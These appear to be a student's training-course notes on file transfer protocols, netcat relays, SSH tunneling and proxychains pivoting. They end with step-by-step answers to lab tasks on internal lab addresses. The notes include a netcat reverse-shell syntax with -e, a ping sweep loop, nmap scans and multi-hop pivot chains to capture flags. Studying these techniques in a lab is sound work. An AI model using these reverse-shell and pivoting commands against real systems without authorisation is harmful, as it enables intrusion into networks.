
============ DAY 6 NETWORKING NOTES ============


common data transfer methods:

TFTP(RFC 1350)
   UDP transport
   extremely small and simple
   insecure
   used often for bootp and pxe

FTP(RFC 959)
    TCP transport
    control 21/data 20
    insecure, auth through clear text
   -Active
   
   -Passive
   
SFTP
   TCP transport(port 22)
   symmetric and asymmetric encryption 
   adds FTP like services to SSH
   auth through sign in or with SSH key
   interactive terminal access
SCP
   TCP transport(port 22)
   symmetric and asymmetric encryption
   auth through sign in or with SSH key
   non interactive
   scp syntax:
   	scp <source> <destination>
   	examples:
   		scp student@172.16.82.106:secretstuff.txt /home/student
   		#download a file from a remote directory to a local directory
   		scp secretstuff.txt student@172.16.82.106:/home/student
   		#upload a file to a remote directory from a local directory
   		scp -3 
   		#copy a file from two remote hosts
   		scp -P <port>
   		#option to specify port
   		scp -r <directory>
   		#use -r to specify directory
FTPS
   TCP transport(port 443)
   addds ssl/tls encryption to ftp
   auth with username password and/or PKI
   interactive terminal access


FTP demo:

touch test,txt
ftp 10.0.0.103
[provide login creds]
passive
[switches to passive mode]
put test.txt
ls 
cd


---------- TRAFFIC REDIRECTION ------------

netcat 

when someone's trying to connect to you: nc -lvp 8888

when someone has a port to connect for you: nc <ip> <port> -e (for execute, ex. vin bash)
reverse shell



NETCAT RELAY DEMO

mkfifo <name>
IH> mkfifo pipe

examples:

IH> nc -lp 9002 0< pipe | nc H2 9001 | 1> pipe
	sender				receiver

H1> nc -lp 9002 < infile.txt
H2> nc -lp 9001 > outfile.txt



-------------------- TUNNELING --------------------


IH> ssh user@H1 -L 1111:H2:22		# local port forwarding using port 22
IH> ssh -p 1111 user@localhost

or

IH> ssh user@H1 -L 1111:H2:80
IH> wget localhost:1111 (-NT) 	#-nt allows you to keep track of your tunnels making the terminals noninteractive and you can see the last command you ran


another example

IH> ssh user@H1 -L 1111:H2:22 -NT 
IH> ssh -p 1111 user@localhost -L 2222:localhost:80


DYNAMIC PORT FORWARDING

IH> ssh user@H1 -L 1111:H2:22	-NT
IH> ssh -p 1111 user@localhost -D 9050 -NT
IH> proxychains wget -r H3
proxychains ftp H3
proxychains nc
proxychains nmap -Pn
proxychains curl
proxychains telnet



$ ssh user@localhost -p 1111 -D 9050 -v -NT
|___________________________||______||_____|
          |                      |      |
          |                      |      '''''''''''''''''|
  ssh authentication         dynamic port forward     options


<close the previous dynamic tunnel>
internet_host$ ssh bill@localhost -p 2222 -L 3333:155.39.88.21:23 -NT
internet_host$ telnet localhost 3333
brian$ ssh bill@155.39.88.17 -p 4567 -R 4444:localhost:22 -NT
internet_host$ ssh bill@localhost -p 2222 -L 5555:localhost:4444 -NT
internet_host$ ssh brian@localhost -p 5555 -D 9050 -NT
internet_host$ proxychains ./scan.sh




ACTIVITY NOTES:



task 3


1. ssh net3_student7@10.50.33.33 -L 30701:10.3.0.27:80 -NT
	different terminal: wget http://localhost:80

2. ssh net3_student7@10.50.33.33 -D 9050 -NT
	different terminal: proxychains wget -r ftp://10.3.0.1


3. telnet then "find / -name flag* 2> /dev/null"

4. telnet 10.50.22.92
	ssh net3_student7@10.3.0.10 -R 30702:localhost:22 -NT
		ssh net3_student7@10.50.33.33 -L 30703:localhost:30702 -NT
			ssh net3_student7@localhost -p 30703 -L 30704:10.2.0.2:80 -NT
				wget -r http://localhost:30704




5. ssh net3_student7@localhost -p 30703 -D 9050 -NT
	proxychains ./scan.sh
		proxychains wget -r ftp://10.2.0.2


6. ssh net3_student7@10.50.33.33 -D 9050 -NT
	proxychains ./scan.sh
		proxychains wget -r http://10.3.0.1


7. proxychains wget -r ftp://10.3.0.27

8. telnet 10.50.22.29
	ssh 10.2.0.3
		find / -name "hint*" 
			proxychains ./scan.sh
				ssh net3_student7@10.50.33.33 -L 30705:10.4.0.1:22 -NT
					ssh net3_student7@localhost -p 30705 -D 9050 -NT
						proxychains ./scan.sh (10.5.0)
							proxychains wget -r ftp://10.5.0.1

9. proxychains wget -r http://10.5.0.1

10. "co-located" meant wait for the scan.sh to finish from question 8
	you then see 10.5.0.57
		proxychains wget -r ftp://10.5.0.57

11. proxychains wget -r http://10.5.0.57

TASK 4

0. nmap -Pn 10.50.31.103 -p 21-23 80 -T4

1. telnet 10.50.31.103
	ssh student@10.50.38.156 -R 30706:localhost:22 -NT
		internethost: ssh -p 30706 net3_student7@localhost -L 30707:localhost:80 -NT
			internethost: ssh -p 30706 net3_student7@localhost -D 9050 -NT
				proxychains ./scan.sh

2. 


going deeper with tunnels
sh -p port net3_student7@localhost -L port:targetip:altportforssh -NT

ping sweep for i in {1..254}; do ping -c 1 -W 1 10.1.1.$i | grep 'from'; done

























